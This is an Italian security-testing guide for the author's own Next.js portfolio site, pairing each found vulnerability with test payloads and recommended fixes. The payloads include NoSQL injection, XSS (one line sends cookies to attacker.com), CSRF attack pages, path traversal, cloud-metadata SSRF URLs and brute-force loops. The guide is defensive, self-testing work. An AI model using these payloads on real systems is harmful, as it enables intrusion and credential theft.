# 🔐 Guida Completa ai Test di Sicurezza
# andreastorci.it Security Testing

## 📋 Indice
1. [SQL/NoSQL Injection](#1-sqlnosql-injection)
2. [Cross-Site Scripting (XSS)](#2-cross-site-scripting-xss)
3. [Authentication & Authorization](#3-authentication--authorization)
4. [API Security](#4-api-security)
5. [File Upload Security](#5-file-upload-security)
6. [Rate Limiting](#6-rate-limiting)
7. [Information Disclosure](#7-information-disclosure)
8. [CSRF Protection](#8-csrf-protection)
9. [Server-Side Request Forgery (SSRF)](#9-server-side-request-forgery-ssrf)
10. [Dependency Security](#10-dependency-security)

---

## 1. SQL/NoSQL Injection

### 🎯 Vulnerabilità Identificate

**File:** `src/app/api/auth/login/route.ts`
```typescript
const data = await collection.findOne({ username });
```

**File:** `src/app/api/logs/route.ts`
```typescript
const updateLog = await collection.updateOne(
    { _id: new ObjectId(process.env.LOGS_ID) },
    body
)
```

### 🧪 Test da Eseguire

#### Test 1: NoSQL Injection nel Login
```bash
# Test con Postman o curl
curl -X POST http://localhost:3000/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{
    "username": {"$ne": null},
    "password": {"$ne": null}
  }'

# Test con operatore $regex
curl -X POST http://localhost:3000/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{
    "username": {"$regex": ".*"},
    "password": "anything"
  }'

# Test con operatore $where
curl -X POST http://localhost:3000/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{
    "username": {"$where": "sleep(5000)"},
    "password": "test"
  }'
```

#### Test 2: Injection nel Country Field
```bash
curl -X POST http://localhost:3000/api/logs \
  -H "Content-Type: application/json" \
  -H "x-forwarded-for: 8.8.8.8" \
  -d '{}'

# Prova a modificare manualmente la risposta dell'API ipapi
# per inserire un country name con caratteri speciali
```

### ✅ Come Verificare
- **VULNERABILE**: Se riesci ad accedere senza credenziali valide
- **SICURO**: Ricevi errore 401/403

### 🛠️ Fix Raccomandato
```typescript
// src/app/api/auth/login/route.ts
interface LoginProps {
    type: 'check' | 'login'
    username: string, // Assicurati che sia SEMPRE una stringa
    password?: string
    token?: string
}

// Aggiungi validazione
if (typeof data.username !== 'string' || typeof data.password !== 'string') {
    return NextResponse.json({ error: 'Invalid input types' }, { status: 400 });
}

// Usa prepared statements o validazione stretta
const sanitizedUsername = String(data.username).replace(/[^a-zA-Z0-9_]/g, '');
```

---

## 2. Cross-Site Scripting (XSS)

### 🎯 Vulnerabilità Identificate

**File:** `src/app/admin/components/edit/project/AddNewproject.tsx`
```typescript
const handleNotification = (message: string | ReactNode) => {
    showNotification({
        message: message, // Potenzialmente non sanitizzato
    })
}
```

**File:** `src/app/admin/components/edit/home/NewsWrapper.tsx`
```typescript
<h3>{currentNews.title}</h3>
<p>{currentNews.content}</p>
```

### 🧪 Test da Eseguire

#### Test 1: XSS nel Form di Aggiunta Progetto
```javascript
// Nel form AddNewproject, prova a inserire:
<script>alert('XSS')</script>

// O payload più sofisticati:
<img src=x onerror="alert('XSS')">
<svg onload="alert('XSS')">
"><script>document.location='http://attacker.com/steal?cookie='+document.cookie</script>

// Payload per React:
{alert('XSS')}
{{alert('XSS')}}
${alert('XSS')}
```

#### Test 2: XSS nelle News
```javascript
// Modifica temporaneamente i dati delle news per includere:
{
  "title": "<script>alert('XSS')</script>",
  "content": "<img src=x onerror='alert(\"XSS\")'>"
}
```

#### Test 3: XSS Stored
```bash
# Aggiungi un progetto con payload XSS
curl -X POST http://localhost:3000/api/update \
  -H "Content-Type: application/json" \
  -d '{
    "dataIt": {
      "name": "<script>alert(\"XSS\")</script>",
      "description": "<img src=x onerror=alert(1)>"
    },
    "updateProp": "projects"
  }'
```

### ✅ Come Verificare
- **VULNERABILE**: Appare un alert JavaScript
- **SICURO**: Il codice viene mostrato come testo

### 🛠️ Fix Raccomandato
```typescript
// Usa DOMPurify per sanitizzare HTML
import DOMPurify from 'dompurify';

const sanitizedTitle = DOMPurify.sanitize(currentNews.title);

// O usa dangerouslySetInnerHTML SOLO se necessario e con sanitizzazione
<div dangerouslySetInnerHTML={{ 
  __html: DOMPurify.sanitize(content) 
}} />

// Per input utente, valida e sanitizza
const sanitizeInput = (input: string): string => {
    return input
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;')
        .replace(/"/g, '&quot;')
        .replace(/'/g, '&#x27;');
};
```

---

## 3. Authentication & Authorization

### 🎯 Vulnerabilità Identificate

**File:** `src/app/api/auth/login/route.ts`
```typescript
const generateToken = (ip: string) => {
    const token = crypto
        .createHmac('sha256', secret!)
        .update(ip)
        .digest('hex');
    return token
}
```
⚠️ **PROBLEMA CRITICO**: Token basato SOLO su IP - facilmente prevedibile!

**File:** `src/app/admin/components/provider/AuthContext.tsx`
```typescript
const token = Cookies.get('token');
// Nessuna refresh token, nessuna scadenza verificata
```

### 🧪 Test da Eseguire

#### Test 1: Token Predictability
```javascript
// Script per generare token prevedibili
const crypto = require('crypto');

// Prova diversi IP comuni
const ips = ['192.168.1.1', '10.0.0.1', '172.16.0.1', '8.8.8.8'];
const secret = 'SECRET_HERE'; // Prova a indovinare o leakare

ips.forEach(ip => {
    const token = crypto
        .createHmac('sha256', secret)
        .update(ip)
        .digest('hex');
    console.log(`IP: ${ip} => Token: ${token}`);
});
```

#### Test 2: Session Hijacking
```bash
# 1. Login da un browser
# 2. Copia il cookie 'token'
# 3. Apri browser in modalità incognito
# 4. Usa DevTools per settare il cookie
document.cookie = "token=COPIED_TOKEN_HERE; path=/";

# 5. Vai su /admin - dovresti essere autenticato
```

#### Test 3: Bypass Authentication
```bash
# Prova ad accedere a route protette senza autenticazione
curl http://localhost:3000/api/update
curl http://localhost:3000/api/delete

# Prova con token invalido
curl http://localhost:3000/admin \
  -H "Cookie: token=fake_token_123"
```

#### Test 4: Brute Force Protection
```bash
# Script per testare rate limiting sul login
for i in {1..100}; do
    curl -X POST http://localhost:3000/api/auth/login \
      -H "Content-Type: application/json" \
      -d '{"username":"admin","password":"wrong'$i'"}' &
done
```

### ✅ Come Verificare
- **VULNERABILE**: Puoi accedere con token generato/rubato
- **VULNERABILE**: Nessun limite ai tentativi di login
- **SICURO**: Token imprevedibili, sessioni che scadono

### 🛠️ Fix Raccomandato
```typescript
// src/app/api/auth/login/route.ts
import { randomBytes } from 'crypto';
import { SignJWT, jwtVerify } from 'jose';

// Genera token JWT sicuri
const generateToken = async (userId: string, ip: string) => {
    const secret = new TextEncoder().encode(process.env.JWT_SECRET);
    
    const token = await new SignJWT({ 
        userId, 
        ip,
        iat: Math.floor(Date.now() / 1000)
    })
    .setProtectedHeader({ alg: 'HS256' })
    .setExpirationTime('24h')
    .setIssuedAt()
    .sign(secret);
    
    return token;
};

// Verifica token
const verifyToken = async (token: string) => {
    try {
        const secret = new TextEncoder().encode(process.env.JWT_SECRET);
        const { payload } = await jwtVerify(token, secret);
        return payload;
    } catch {
        return null;
    }
};

// Rate limiting
const loginAttempts = new Map<string, { count: number, lastAttempt: number }>();

const checkRateLimit = (ip: string): boolean => {
    const now = Date.now();
    const attempts = loginAttempts.get(ip);
    
    if (!attempts) {
        loginAttempts.set(ip, { count: 1, lastAttempt: now });
        return true;
    }
    
    // Reset dopo 15 minuti
    if (now - attempts.lastAttempt > 15 * 60 * 1000) {
        loginAttempts.set(ip, { count: 1, lastAttempt: now });
        return true;
    }
    
    // Max 5 tentativi per 15 minuti
    if (attempts.count >= 5) {
        return false;
    }
    
    attempts.count++;
    attempts.lastAttempt = now;
    return true;
};
```

---

## 4. API Security

### 🎯 Vulnerabilità Identificate

**File:** `src/app/api/translate/route.ts`
```typescript
// NESSUNA autenticazione per endpoint costoso!
export async function POST(req: Request) {
    const reqData: TranslateProp = await req.json()
    // Chiama servizio esterno senza rate limiting
}
```

**File:** `src/app/api/update/route.ts`, `api/delete/route.ts`
```typescript
// Operazioni CRITICHE senza autenticazione!
export async function POST(req: Request) {
    // Modifica/elimina dati direttamente
}
```

### 🧪 Test da Eseguire

#### Test 1: Unauthorized API Access
```bash
# Prova a chiamare API senza autenticazione
curl -X POST http://localhost:3000/api/update \
  -H "Content-Type: application/json" \
  -d '{
    "dataIt": {"name": "Hacked"},
    "updateProp": "projects"
  }'

curl -X POST http://localhost:3000/api/delete \
  -H "Content-Type: application/json" \
  -d '{"attribute": "projects", "index": 0}'

curl -X POST http://localhost:3000/api/translate \
  -H "Content-Type: application/json" \
  -d '{"data": "test", "lang": "en"}'
```

#### Test 2: API Abuse / DoS
```bash
# Script per saturare l'API di traduzione
for i in {1..1000}; do
    curl -X POST http://localhost:3000/api/translate \
      -H "Content-Type: application/json" \
      -d '{
        "data": "Very long text to translate that costs money...",
        "lang": "en"
      }' &
done
```

#### Test 3: Data Validation
```bash
# Prova payload malformati
curl -X POST http://localhost:3000/api/update \
  -H "Content-Type: application/json" \
  -d '{"updateProp": "../../../etc/passwd"}'

curl -X POST http://localhost:3000/api/delete \
  -H "Content-Type: application/json" \
  -d '{"attribute": "projects", "index": -1}'

curl -X POST http://localhost:3000/api/delete \
  -H "Content-Type: application/json" \
  -d '{"attribute": "projects", "index": 999999}'
```

### ✅ Come Verificare
- **VULNERABILE**: API rispondono senza autenticazione
- **VULNERABILE**: Puoi modificare/eliminare dati arbitrariamente
- **SICURO**: 401/403 su richieste non autorizzate

### 🛠️ Fix Raccomandato
```typescript
// src/middleware.ts (CREA QUESTO FILE)
import { NextResponse } from 'next/server';
import type { NextRequest } from 'next/server';

export async function middleware(request: NextRequest) {
    // Lista di endpoint protetti
    const protectedPaths = [
        '/api/update',
        '/api/delete',
        '/api/translate',
    ];
    
    const isProtected = protectedPaths.some(path => 
        request.nextUrl.pathname.startsWith(path)
    );
    
    if (isProtected) {
        const token = request.cookies.get('token')?.value;
        
        if (!token) {
            return NextResponse.json(
                { error: 'Unauthorized' },
                { status: 401 }
            );
        }
        
        // Verifica token (usa la funzione creata prima)
        const isValid = await verifyToken(token);
        if (!isValid) {
            return NextResponse.json(
                { error: 'Invalid token' },
                { status: 401 }
            );
        }
    }
    
    return NextResponse.next();
}

export const config = {
    matcher: '/api/:path*',
};

// Rate limiting per API costose
// src/lib/rateLimiter.ts
const apiLimits = new Map<string, { count: number, reset: number }>();

export const checkApiLimit = (
    identifier: string,
    maxRequests: number = 10,
    windowMs: number = 60000
): boolean => {
    const now = Date.now();
    const limit = apiLimits.get(identifier);
    
    if (!limit || now > limit.reset) {
        apiLimits.set(identifier, {
            count: 1,
            reset: now + windowMs
        });
        return true;
    }
    
    if (limit.count >= maxRequests) {
        return false;
    }
    
    limit.count++;
    return true;
};

// Usa in api/translate/route.ts
import { checkApiLimit } from '@/lib/rateLimiter';

export async function POST(req: Request) {
    const ip = req.headers.get('x-forwarded-for') || 'unknown';
    
    if (!checkApiLimit(ip, 10, 60000)) {
        return NextResponse.json(
            { error: 'Rate limit exceeded' },
            { status: 429 }
        );
    }
    
    // ... resto del codice
}
```

---

## 5. File Upload Security

### 🎯 Vulnerabilità Identificate

**File:** `src/app/admin/components/edit/project/AddNewproject.tsx`
```typescript
// Input per 'image' URL - nessuna validazione
<input onChange={(e) => handleUpdate('image', e.target.value)} />
```

### 🧪 Test da Eseguire

#### Test 1: Path Traversal
```javascript
// Nel form, prova a inserire:
../../../etc/passwd
../../../../../../windows/system32/config/sam

// O URL malevoli:
file:///etc/passwd
javascript:alert('XSS')
data:text/html,<script>alert('XSS')</script>
```

#### Test 2: SSRF via Image URL
```javascript
// Prova URL interni:
http://localhost:3000/api/logs
http://169.254.169.254/latest/meta-data/
http://localhost:27017/ // MongoDB
http://localhost:5432/ // PostgreSQL
```

### ✅ Come Verificare
- **VULNERABILE**: Puoi accedere a file/risorse interne
- **SICURO**: URL viene validato e sanitizzato

### 🛠️ Fix Raccomandato
```typescript
// src/lib/urlValidator.ts
export const isValidImageUrl = (url: string): boolean => {
    try {
        const parsed = new URL(url);
        
        // Solo HTTPS per immagini esterne
        if (parsed.protocol !== 'https:' && parsed.protocol !== 'http:') {
            return false;
        }
        
        // Blocca localhost e IP privati
        const hostname = parsed.hostname.toLowerCase();
        if (
            hostname === 'localhost' ||
            hostname === '127.0.0.1' ||
            hostname.startsWith('192.168.') ||
            hostname.startsWith('10.') ||
            hostname.startsWith('172.16.')
        ) {
            return false;
        }
        
        // Solo estensioni immagine valide
        const validExtensions = ['.jpg', '.jpeg', '.png', '.gif', '.webp', '.svg'];
        const hasValidExtension = validExtensions.some(ext => 
            parsed.pathname.toLowerCase().endsWith(ext)
        );
        
        return hasValidExtension;
    } catch {
        return false;
    }
};

// Usa nel form
const handleUpdate = (attr: string, newVal: any) => {
    if (attr === 'image' && !isValidImageUrl(newVal)) {
        showNotification({
            type: 'error',
            message: 'URL immagine non valido'
        });
        return;
    }
    
    setNewProject(prev => ({
        ...prev,
        [attr]: newVal
    }));
};
```

---

## 6. Rate Limiting

### 🧪 Test da Eseguire

#### Test 1: Login Brute Force
```bash
# Script Python per test automatizzato
import requests
import time

url = "http://localhost:3000/api/auth/login"
passwords = ["pass1", "pass2", "pass3", ..., "pass1000"]

for password in passwords:
    response = requests.post(url, json={
        "username": "admin",
        "password": password
    })
    print(f"Attempt: {password} - Status: {response.status_code}")
    time.sleep(0.1)  # Ritardo minimo
```

#### Test 2: API Flooding
```bash
# Testa ogni endpoint principale
ab -n 1000 -c 50 -p payload.json -T application/json \
  http://localhost:3000/api/translate

ab -n 1000 -c 50 \
  http://localhost:3000/api/news
```

### ✅ Come Verificare
- **VULNERABILE**: Tutte le richieste vanno a buon fine
- **SICURO**: Dopo N richieste, ricevi 429 (Too Many Requests)

### 🛠️ Fix Raccomandato
```typescript
// src/lib/rateLimiter.ts - Versione avanzata
import { LRUCache } from 'lru-cache';

type RateLimitConfig = {
    interval: number;  // millisecondi
    maxRequests: number;
};

const limiters = new Map<string, LRUCache<string, number[]>>();

export const createRateLimiter = (name: string, config: RateLimitConfig) => {
    const cache = new LRUCache<string, number[]>({
        max: 500,
        ttl: config.interval,
    });
    
    limiters.set(name, cache);
    
    return (identifier: string): boolean => {
        const now = Date.now();
        const timestamps = cache.get(identifier) || [];
        
        // Rimuovi timestamp vecchi
        const validTimestamps = timestamps.filter(
            ts => now - ts < config.interval
        );
        
        if (validTimestamps.length >= config.maxRequests) {
            return false;
        }
        
        validTimestamps.push(now);
        cache.set(identifier, validTimestamps);
        
        return true;
    };
};

// Definisci limiti per diversi endpoint
export const loginLimiter = createRateLimiter('login', {
    interval: 15 * 60 * 1000, // 15 minuti
    maxRequests: 5
});

export const apiLimiter = createRateLimiter('api', {
    interval: 60 * 1000, // 1 minuto
    maxRequests: 30
});

export const translateLimiter = createRateLimiter('translate', {
    interval: 60 * 1000,
    maxRequests: 10
});

// Usa negli endpoint
export async function POST(req: Request) {
    const ip = req.headers.get('x-forwarded-for')?.split(',')[0] || 'unknown';
    
    if (!loginLimiter(ip)) {
        return NextResponse.json(
            { 
                error: 'Too many login attempts. Try again in 15 minutes.',
                retryAfter: 900 
            },
            { 
                status: 429,
                headers: {
                    'Retry-After': '900'
                }
            }
        );
    }
    
    // ... resto del codice
}
```

---

## 7. Information Disclosure

### 🎯 Vulnerabilità Identificate

1. **File system paths** esposti negli errori
2. **Environment variables** potenzialmente visibili
3. **Stack traces** in produzione
4. **Directory listing** abilitato

### 🧪 Test da Eseguire

#### Test 1: Error Messages
```bash
# Prova richieste malformate per vedere errori
curl -X POST http://localhost:3000/api/update \
  -H "Content-Type: application/json" \
  -d 'INVALID_JSON'

curl http://localhost:3000/api/nonexistent

# Cerca messaggi di errore dettagliati che rivelano:
# - Percorsi file system
# - Versioni software
# - Stack traces
# - Query database
```

#### Test 2: Source Map Leakage
```bash
# Verifica se i source maps sono esposti in produzione
curl http://yoursite.com/_next/static/chunks/main.js.map

# Cerca file di configurazione esposti
curl http://yoursite.com/.env
curl http://yoursite.com/package.json
curl http://yoursite.com/.git/config
```

#### Test 3: HTTP Headers
```bash
# Controlla header che rivelano informazioni
curl -I http://localhost:3000

# Cerca:
# X-Powered-By: Next.js
# Server: nginx/1.18.0
# X-Debug-Info: ...
```

#### Test 4: Robots.txt / Security.txt
```bash
curl http://localhost:3000/robots.txt
curl http://localhost:3000/.well-known/security.txt

# Controlla se rivelano path sensibili
```

### ✅ Come Verificare
- **VULNERABILE**: Errori dettagliati, path visibili, versioni esposte
- **SICURO**: Messaggi generici, nessun dettaglio tecnico

### 🛠️ Fix Raccomandato
```typescript
// next.config.js
module.exports = {
    // Disabilita source maps in produzione
    productionBrowserSourceMaps: false,
    
    // Headers di sicurezza
    async headers() {
        return [
            {
                source: '/(.*)',
                headers: [
                    {
                        key: 'X-Content-Type-Options',
                        value: 'nosniff'
                    },
                    {
                        key: 'X-Frame-Options',
                        value: 'DENY'
                    },
                    {
                        key: 'X-XSS-Protection',
                        value: '1; mode=block'
                    },
                    {
                        key: 'Referrer-Policy',
                        value: 'strict-origin-when-cross-origin'
                    },
                    {
                        key: 'Permissions-Policy',
                        value: 'camera=(), microphone=(), geolocation=()'
                    }
                ]
            }
        ];
    }
};

// src/lib/errorHandler.ts
export const handleApiError = (error: unknown): NextResponse => {
    // Log dettagliato solo server-side
    console.error('API Error:', error);
    
    // Risposta generica al client
    if (process.env.NODE_ENV === 'production') {
        return NextResponse.json(
            { error: 'An error occurred. Please try again.' },
            { status: 500 }
        );
    }
    
    // In sviluppo, mostra dettagli
    return NextResponse.json(
        { 
            error: error instanceof Error ? error.message : 'Unknown error',
            stack: error instanceof Error ? error.stack : undefined
        },
        { status: 500 }
    );
};

// .gitignore - Assicurati di avere:
.env
.env.local
.env.production
.env.development
*.log
.DS_Store
node_modules/
.next/
out/
build/
dist/
```

---

## 8. CSRF Protection

### 🎯 Vulnerabilità Identificate

Tutte le form e API POST **NON** hanno protezione CSRF!

### 🧪 Test da Eseguire

#### Test 1: CSRF su Login
```html
<!-- Crea file malicious.html -->
<!DOCTYPE html>
<html>
<body>
    <h1>Click to win a prize!</h1>
    <form id="csrf-form" action="http://localhost:3000/api/auth/login" method="POST">
        <input type="hidden" name="username" value="attacker">
        <input type="hidden" name="password" value="hacked">
    </form>
    <script>
        document.getElementById('csrf-form').submit();
    </script>
</body>
</html>
```

#### Test 2: CSRF su Update/Delete
```html
<!-- malicious-update.html -->
<html>
<body>
    <script>
        fetch('http://localhost:3000/api/delete', {
            method: 'POST',
            credentials: 'include',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                attribute: 'projects',
                index: 0
            })
        });
    </script>
</body>
</html>
```

### ✅ Come Verificare
- **VULNERABILE**: Le azioni vengono eseguite da siti esterni
- **SICURO**: Richieste da origini diverse vengono bloccate

### 🛠️ Fix Raccomandato
```typescript
// src/lib/csrf.ts
import { randomBytes } from 'crypto';

export const generateCsrfToken = (): string => {
    return randomBytes(32).toString('hex');
};

export const verifyCsrfToken = (token: string, expected: string): boolean => {
    return token === expected;
};

// src/middleware.ts
import { NextResponse } from 'next/server';
import type { NextRequest } from 'next/server';

export async function middleware(request: NextRequest) {
    // Verifica origin per richieste POST/PUT/DELETE
    const dangerousMethods = ['POST', 'PUT', 'DELETE'];
    
    if (dangerousMethods.includes(request.method)) {
        const origin = request.headers.get('origin');
        const host = request.headers.get('host');
        
        // Verifica che l'origin corrisponda al tuo dominio
        if (origin && !origin.includes(host || '')) {
            return NextResponse.json(
                { error: 'Invalid origin' },
                { status: 403 }
            );
        }
        
        // Verifica CSRF token per richieste da browser
        const csrfToken = request.headers.get('x-csrf-token');
        const cookieCsrfToken = request.cookies.get('csrf-token')?.value;
        
        if (!csrfToken || csrfToken !== cookieCsrfToken) {
            return NextResponse.json(
                { error: 'Invalid CSRF token' },
                { status: 403 }
            );
        }
    }
    
    return NextResponse.next();
}

// In ogni form, includi il token
import { useEffect, useState } from 'react';

const MyForm = () => {
    const [csrfToken, setCsrfToken] = useState('');
    
    useEffect(() => {
        // Ottieni token dal server
        fetch('/api/csrf-token')
            .then(r => r.json())
            .then(data => setCsrfToken(data.token));
    }, []);
    
    const handleSubmit = async (e) => {
        e.preventDefault();
        
        await fetch('/api/update', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'X-CSRF-Token': csrfToken
            },
            body: JSON.stringify(data)
        });
    };
    
    return <form onSubmit={handleSubmit}>...</form>;
};
```

---

## 9. Server-Side Request Forgery (SSRF)

### 🎯 Vulnerabilità Identificate

**File:** `src/app/api/news/route.ts`
```typescript
const url = 'https://newsapi.org/v2/everything?...';
const reqNews = await fetch(url); // URL costruito dinamicamente
```

### 🧪 Test da Eseguire

#### Test 1: SSRF via News API
```bash
# Prova a modificare parametri URL se accetti input utente
# (attualmente non accetti, ma è un esempio)

# Se permettessi all'utente di specificare URL:
curl -X POST http://localhost:3000/api/news \
  -H "Content-Type: application/json" \
  -d '{"url": "http://localhost:27017/"}'

# O prova redirect chains
curl -X POST http://localhost:3000/api/news \
  -d '{"url": "http://bit.ly/redirect-to-localhost"}'
```

#### Test 2: Metadata Service Access
```bash
# Se l'app è su AWS/GCP/Azure, prova:
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://metadata.google.internal/computeMetadata/v1/
http://169.254.169.254/metadata/instance?api-version=2020-09-01
```

### ✅ Come Verificare
- **VULNERABILE**: Puoi fare richieste a servizi interni
- **SICURO**: Solo URL whitelistati sono accessibili

### 🛠️ Fix Raccomandato
```typescript
// src/lib/ssrfProtection.ts
const BLOCKED_IPS = [
    '127.0.0.1',
    'localhost',
    '0.0.0.0',
    '169.254.169.254', // AWS metadata
    '::1',
];

const BLOCKED_CIDRS = [
    '10.0.0.0/8',
    '172.16.0.0/12',
    '192.168.0.0/16',
    'fc00::/7',
];

export const isUrlSafe = async (url: string): Promise<boolean> => {
    try {
        const parsed = new URL(url);
        
        // Solo HTTP/HTTPS
        if (!['http:', 'https:'].includes(parsed.protocol)) {
            return false;
        }
        
        // Risolvi DNS per verificare IP
        const { lookup } = await import('dns').then(m => m.promises);
        const { address } = await lookup(parsed.hostname);
        
        // Blocca IP privati e localhost
        if (BLOCKED_IPS.includes(address)) {
            return false;
        }
        
        // Verifica CIDR ranges
        // (implementazione semplificata, usa libreria come 'ip-cidr' per produzione)
        
        return true;
    } catch {
        return false;
    }
};

// Usa nell'API
export async function POST(req: Request) {
    const { url } = await req.json();
    
    if (!await isUrlSafe(url)) {
        return NextResponse.json(
            { error: 'Invalid URL' },
            { status: 400 }
        );
    }
    
    const response = await fetch(url, {
        redirect: 'manual', // Non seguire redirect
        signal: AbortSignal.timeout(5000) // Timeout
    });
    
    // ...
}
```

---

## 10. Dependency Security

### 🧪 Test da Eseguire

#### Test 1: Audit Dependencies
```bash
# NPM audit
npm audit
npm audit --production

# Yarn audit
yarn audit

# Controlla outdated packages
npm outdated

# Usa tools automatici
npx audit-ci --moderate
npx snyk test
```

#### Test 2: Check per Vulnerabilità Note
```bash
# Installa retire.js
npm install -g retire

# Scansiona il progetto
retire --path /path/to/project

# Usa GitHub Dependabot (già attivo se su GitHub)
# Controlla Security → Dependabot alerts
```

#### Test 3: License Compliance
```bash
# Verifica licenze
npx license-checker --summary
npx license-checker --production --onlyAllow="MIT;Apache-2.0;BSD-2-Clause;BSD-3-Clause;ISC"
```

### ✅ Come Verificare
- **VULNERABILE**: Vulnerabilità HIGH/CRITICAL trovate
- **SICURO**: Nessuna vulnerabilità o tutte patched

### 🛠️ Fix Raccomandato
```json
// package.json
{
  "scripts": {
    "audit": "npm audit",
    "audit:fix": "npm audit fix",
    "audit:force": "npm audit fix --force",
    "preinstall": "npm audit --audit-level=high"
  }
}

// .github/workflows/security.yml
name: Security Audit

on:
  push:
    branches: [main]
  pull_request:
    branches: [main]
  schedule:
    # Ogni lunedì alle 9:00
    - cron: '0 9 * * 1'

jobs:
  audit:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
      - uses: actions/setup-node@v3
      - run: npm audit --audit-level=moderate
      - run: npx audit-ci --moderate
```

---

## 📊 Checklist Finale

### 🔴 Critiche (FIX IMMEDIATO)

- [ ] Implementa autenticazione JWT invece di token basati su IP
- [ ] Aggiungi middleware per proteggere API `/update`, `/delete`, `/translate`
- [ ] Implementa rate limiting su login (max 5 tentativi / 15 min)
- [ ] Sanitizza tutti gli input utente prima di salvarli (XSS prevention)
- [ ] Valida tipi di dato per prevenire NoSQL injection
- [ ] Aggiungi CSRF protection su tutte le form
- [ ] Nascondi error messages dettagliati in produzione

### 🟡 Importanti (PROSSIMI GIORNI)

- [ ] Implementa validazione URL per immagini
- [ ] Aggiungi rate limiting su API costose (translate, news)
- [ ] Configura security headers in next.config.js
- [ ] Disabilita source maps in produzione
- [ ] Implementa logging sicuro (no info sensibili)
- [ ] Aggiungi validazione su tutti gli input numerici (index, count, etc.)
- [ ] Configura Content Security Policy (CSP)

### 🟢 Nice to Have

- [ ] Implementa refresh tokens per sessioni lunghe
- [ ] Aggiungi 2FA opzionale
- [ ] Monitora accessi anomali (troppi errori, IP strani)
- [ ] Implementa password strength requirements
- [ ] Aggiungi account lockout dopo N failed logins
- [ ] Usa HTTPS-only cookies con Secure e HttpOnly flags
- [ ] Implementa HSTS (HTTP Strict Transport Security)

---

## 🛠️ Tools Consigliati

### Automated Scanners
- **OWASP ZAP**: Scanner completo per web app
- **Burp Suite Community**: Testing manuale approfondito
- **Snyk**: Vulnerabilità dipendenze
- **npm audit / yarn audit**: Built-in Node.js
- **SonarQube**: Analisi codice statico

### Manual Testing
- **Postman**: Test API
- **curl**: Command-line testing
- **Browser DevTools**: Network, Storage, Console
- **Wireshark**: Network traffic analysis

### Continuous Monitoring
- **GitHub Dependabot**: Dipendenze automatiche
- **Snyk Monitor**: Monitoring continuo
- **Sentry**: Error tracking
- **LogRocket**: Session replay

---

## 📝 Report Template

Dopo ogni test, documenta i risultati:

```markdown
# Security Test Report
Date: [DATA]
Tester: [NOME]

## Test Eseguiti
- [ ] SQL/NoSQL Injection
- [ ] XSS
- [ ] Authentication
- [ ] API Security
- [ ] CSRF
- [ ] SSRF
- [ ] Rate Limiting

## Vulnerabilità Trovate

### 1. [Nome Vulnerabilità]
**Severity**: Critical/High/Medium/Low
**Location**: [File/Endpoint]
**Description**: [Descrizione]
**Reproduction Steps**:
1. Step 1
2. Step 2

**Impact**: [Cosa può fare un attacker]
**Fix**: [Come risolvere]
**Status**: Open/In Progress/Fixed

## Raccomandazioni

1. Fix immediati
2. Miglioramenti futuri
3. Monitoring da implementare
```

---

## 🚨 Emergency Response Plan

Se trovi una vulnerabilità CRITICA:

1. **Documenta** tutto (screenshot, payload, riproduzione)
2. **Non condividere** pubblicamente la vulnerabilità
3. **Fix immediately** in locale
4. **Test the fix** accuratamente
5. **Deploy ASAP** in produzione
6. **Rotate credentials** se necessario (API keys, passwords, tokens)
7. **Review logs** per vedere se è stata exploitata
8. **Notify users** se i loro dati sono stati compromessi (GDPR)

---

## 📚 Risorse Utili

- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [OWASP Cheat Sheet Series](https://cheatsheetseries.owasp.org/)
- [PortSwigger Web Security Academy](https://portswigger.net/web-security)
- [HackerOne Hacktivity](https://hackerone.com/hacktivity)
- [MITRE ATT&CK](https://attack.mitre.org/)

---

**NOTA IMPORTANTE**: Testa SOLO sul tuo ambiente di sviluppo/staging. NON eseguire questi test in produzione senza backup e piano di rollback!
